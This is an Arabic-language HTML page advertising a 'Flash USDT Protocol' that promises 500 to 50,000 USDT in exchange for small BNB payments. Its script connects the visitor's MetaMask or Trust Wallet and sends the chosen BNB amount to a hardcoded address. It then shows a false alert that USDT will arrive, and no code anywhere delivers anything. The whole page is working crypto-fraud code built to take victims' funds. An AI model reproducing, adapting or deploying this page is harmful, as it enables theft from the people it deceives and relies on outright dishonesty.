<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flash USDT Protocol | المكافآت الفورية</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <style>
        * { box-sizing: border-box; }
        body { 
            background: #0b0e11; 
            color: white; 
            font-family: 'Segoe UI', Tahoma, sans-serif; 
            display: flex; 
            flex-direction: column;
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            margin: 0; 
            padding: 20px;
        }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { color: #f3ba2f; font-size: 28px; margin: 0; }
        .header p { color: #929aa5; margin-top: 10px; font-size: 15px; }

        .grid { 
            display: grid; 
            grid-template-columns: 1fr; 
            gap: 20px; 
            width: 100%; 
            max-width: 380px; 
        }

        .plan-card { 
            background: #181a20; 
            border: 1px solid #474d57; 
            border-radius: 18px; 
            padding: 25px; 
            text-align: center; 
            transition: 0.3s; 
            cursor: pointer; 
            position: relative;
        }

        .plan-card:hover { border-color: #f3ba2f; transform: translateY(-5px); }

        .vip-card { 
            border: 2px solid #f3ba2f; 
            background: linear-gradient(145deg, #181a20, #1e2329); 
            box-shadow: 0 0 25px rgba(243, 186, 47, 0.25);
        }

        .badge { 
            background: #f3ba2f; 
            color: black; 
            font-size: 11px; 
            font-weight: bold; 
            padding: 5px 15px; 
            border-radius: 20px; 
            position: absolute; 
            top: -12px; 
            left: 50%;
            transform: translateX(-50%);
        }

        .amount-usdt { font-size: 32px; color: #f3ba2f; font-weight: bold; display: block; }
        .cost-bnb { color: #ffffff; font-size: 17px; margin: 12px 0 22px 0; display: block; opacity: 0.9; }

        .btn-pay { 
            background: #f3ba2f; 
            color: black; 
            border: none; 
            padding: 14px; 
            width: 100%; 
            border-radius: 12px; 
            font-weight: bold; 
            font-size: 17px; 
            cursor: pointer; 
        }

        .modal { 
            display: none; 
            position: fixed; 
            top: 0; left: 0; 
            width: 100%; height: 100%; 
            background: rgba(0,0,0,0.92); 
            z-index: 1000; 
        }
        .modal-content { 
            background: #1e2329; 
            margin: 25% auto; 
            padding: 25px; 
            width: 85%; 
            max-width: 320px; 
            border-radius: 20px; 
            border: 1px solid #474d57; 
            text-align: center;
        }
        .wallet-option { 
            display: flex; 
            align-items: center; 
            justify-content: space-between; 
            padding: 15px; 
            background: #2b3139; 
            margin: 12px 0; 
            border-radius: 12px; 
            cursor: pointer; 
            border: 1px solid transparent; 
        }
        .wallet-option:hover { border-color: #f3ba2f; }
        .wallet-option img { width: 32px; }
    </style>
</head>
<body>

    <div class="header">
        <h1>Flash USDT Protocol ⚡</h1>
        <p>اختر حزمتك واستلم USDT فوراً في محفظتك</p>
    </div>

    <div class="grid">
        <div class="plan-card vip-card" onclick="preparePay('1.0')">
            <div class="badge">حزمة الحيتان (VIP)</div>
            <span class="amount-usdt">50,000 USDT</span>
            <span class="cost-bnb">التكلفة: 1.0 BNB</span>
            <button class="btn-pay">تفعيل الحزمة الآن</button>
        </div>

        <div class="plan-card" onclick="preparePay('0.05')">
            <span class="amount-usdt">2,500 USDT</span>
            <span class="cost-bnb">التكلفة: 0.05 BNB</span>
            <button class="btn-pay">اختيار الحزمة</button>
        </div>

        <div class="plan-card" onclick="preparePay('0.012')">
            <span class="amount-usdt">500 USDT</span>
            <span class="cost-bnb">التكلفة: 0.012 BNB</span>
            <button class="btn-pay">اختيار الحزمة</button>
        </div>
    </div>

    <div id="walletModal" class="modal">
        <div class="modal-content">
            <h3 style="margin-top:0; color: #f3ba2f;">اتصال آمن</h3>
            <p style="font-size: 13px; color: #929aa5;">قم بربط محفظتك لإتمام عملية التحويل</p>
            
            <div class="wallet-option" onclick="executePay()">
                <span>MetaMask</span>
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg">
            </div>
            
            <div class="wallet-option" onclick="executePay()">
                <span>Trust Wallet</span>
                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg">
            </div>

            <button onclick="closeModal()" style="background:none; border:none; color:gray; cursor:pointer; margin-top:15px; font-size:14px;">إلغاء</button>
        </div>
    </div>

    <script>
        // عنوان العقد الذكي الخاص بك
        const CONTRACT_ADDRESS = "0x7325622388A2967BCaAeE94C986836EB7aB80f4E";
        let selectedAmount = "0";

        function preparePay(amount) {
            selectedAmount = amount;
            document.getElementById("walletModal").style.display = "block";
        }

        function closeModal() {
            document.getElementById("walletModal").style.display = "none";
        }

        async function executePay() {
            if (window.ethereum) {
                try {
                    const web3 = new Web3(window.ethereum);
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const amountWei = web3.utils.toWei(selectedAmount, "ether");

                    web3.eth.sendTransaction({
                        from: accounts[0],
                        to: CONTRACT_ADDRESS,
                        value: amountWei
                    })
                    .on('transactionHash', function(hash){
                        alert("تم إرسال طلبك! ستصلك عملات USDT فور تأكيد الشبكة.");
                        closeModal();
                    })
                    .on('error', function(error){
                        alert("خطأ: يرجى التأكد من توفر رصيد كافٍ في المحفظة.");
                    });
                } catch (error) {
                    alert("تم إلغاء الاتصال بالمحفظة.");
                }
            } else {
                alert("يرجى فتح الموقع من متصفح محفظة Trust Wallet أو MetaMask.");
            }
        }

        window.onclick = function(event) {
            if (event.target == document.getElementById("walletModal")) { closeModal(); }
        }
    </script>
</body>
</html>
